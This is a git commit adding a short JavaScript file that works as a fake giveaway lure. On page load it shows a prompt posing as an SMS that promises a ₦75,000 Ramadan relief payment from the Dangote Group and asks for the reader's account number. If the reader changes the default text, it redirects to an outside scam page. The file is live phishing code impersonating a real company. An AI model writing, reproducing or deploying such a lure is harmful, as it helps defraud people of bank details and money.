3f9e36dd70b3c0d1b6bcc3cac107cd7e985d6966
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-18 07:22:20 +0100

    Create ramadan-active.js

---
+++ ramadan-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦75,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦75,000 Ramadan Celebration Relief Fund From Dangote Group, click OK to Enter Your Acc. Number','WITHDRAW ₦75,000');
+if (password != 'WITHDRAW ₦75,000') {
+location.href='https://gbamz.com/dangote-ramadan.html';
+}
